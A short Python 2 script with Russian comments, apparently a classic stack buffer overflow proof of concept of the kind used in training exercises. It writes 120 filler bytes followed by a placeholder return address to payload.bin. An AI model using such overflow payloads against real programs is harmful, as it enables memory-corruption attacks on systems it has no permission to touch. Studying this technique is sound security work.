#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-classic-poc.py

import struct


def little_endian(num):
	"""Упаковка адреса в формат little-endian (x64)."""
	return struct.pack('<Q', num)


junk = 'A' * 120
ret_addr = little_endian(0xd34dc0d3)

payload = junk + ret_addr

with open('payload.bin', 'wb') as f:
	f.write(payload)
